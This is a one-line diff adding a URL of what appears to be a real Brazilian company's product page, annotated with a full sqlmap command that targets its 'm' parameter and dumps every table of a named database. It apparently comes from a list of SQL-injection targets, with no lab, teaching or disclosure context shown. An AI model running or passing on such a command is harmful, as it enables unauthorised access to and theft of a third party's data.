@@ -1,0 +1,1 @@
+http://www.agrofortepa.com.br/produtos.php?m=29 (GET)  # sqlmap.py -u http://www.agrofortepa.com.br/produtos.php?m=29 -D agrofort_bd --tables --dump-all --threads 5 -v3
